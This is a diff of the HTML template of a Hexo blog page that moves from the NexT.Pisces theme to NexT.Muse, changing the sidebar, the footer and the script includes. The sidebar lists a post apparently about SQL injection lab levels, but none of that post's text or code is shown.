-                <a href="/archives/%7C%7C%20archive">
-              
-                  <span class="site-state-item-count">28</span>
-                  <span class="site-state-item-name">posts</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
-                  <span class="site-state-item-count">9</span>
-                  <span class="site-state-item-name">categories</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
-                  <span class="site-state-item-count">12</span>
-                  <span class="site-state-item-name">tags</span>
-                </a>
-              </div>
-            
-
-          </nav>
-
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
-
-        </div>
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Preparation%EF%BC%9A"><span class="nav-text">Preparation：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic"><span class="nav-text">Basic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-1"><span class="nav-text">Less-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-2"><span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-3"><span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-4"><span class="nav-text">Less-4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5"><span class="nav-text">Less-5</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">ATT_POWER</span>
-
-  
-</div>
-
-
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-          <span id="scrollpercent"><span>0</span>%</span>
-        
-      </div>
-    
-
-    
-
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
   }
 </script>
 
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Preparation%EF%BC%9A"><span class="nav-text">Preparation：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic"><span class="nav-text">Basic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-1"><span class="nav-text">Less-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-2"><span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-3"><span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-4"><span class="nav-text">Less-4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5"><span class="nav-text">Less-5</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ATT_POWER</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yglsaltfish" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yglsaltfish" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ATT_POWER</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
 
 
 
 
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
 
 
 
@@ -770,133 +474,67 @@ ord<span class="token punctuation">(</span><span class="token punctuation">)</sp
 
 
 
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-  
-  
-  
-  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
-
-  
-  
-  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
-  
-
-  <script src="/js/src/algolia-search.js?v=5.1.4"></script>
 
 
 
   
 
   
+      
 
-  
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
 
-  
-  
-
-  
-
-  
+    
 
   
 
